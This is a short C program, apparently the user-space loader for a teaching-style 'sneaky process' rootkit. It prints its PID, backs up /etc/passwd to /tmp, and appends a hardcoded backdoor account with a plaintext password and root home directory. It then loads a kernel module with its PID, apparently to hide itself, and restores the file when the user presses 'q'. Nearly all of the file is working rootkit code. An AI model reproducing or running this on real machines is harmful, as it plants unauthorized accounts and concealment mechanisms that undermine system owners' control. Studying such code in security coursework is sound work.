#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#define MAXLEN 100

// Record pid
int pid = 0;

// Run command
void runCMD(char *cmd) { system(cmd); }

// Step 1: Print PID
void printPid() {
  pid = getpid();
  printf("sneaky_process pid = %d\n", pid);
}

// Step 2.1: Copy Password from '/etc/passwd' to '/tmp/passwd'
void cpPasswd() {
  char *cp_CMD = "cp /etc/passwd /tmp";
  runCMD(cp_CMD);
}

// Step 2.2 Write new userInfo to '/etc/passwd'
void writePasswd() {
  char *write_CMD =
      "echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
      "/etc/passwd";
  runCMD(write_CMD);
}

// Step 3 Load module
void load() {
  char load_CMD[1024];
  sprintf(load_CMD, "insmod sneaky_mod.ko pid=%d", pid);
  printf("%s\n", load_CMD);
  system(load_CMD);
}

// Step 4 Get UserInput
void getInput() {
  char input;
  while (1) {
    input = getchar();
    if (input != 'q')
      continue;
    else
      break;
  }
}

int main() {
  // Step 1: printInfo
  printPid();

  // Step 2: cp passwd
  cpPasswd();
  writePasswd();

  // Step 3: load module
  load();

  // Step 4: get 'q'
  getInput();

  // Step 5: unload module
  runCMD("rmmod sneaky_mod");

  // Step 6: restore passwd
  runCMD("cp /tmp/passwd /etc");

  return EXIT_SUCCESS;
}
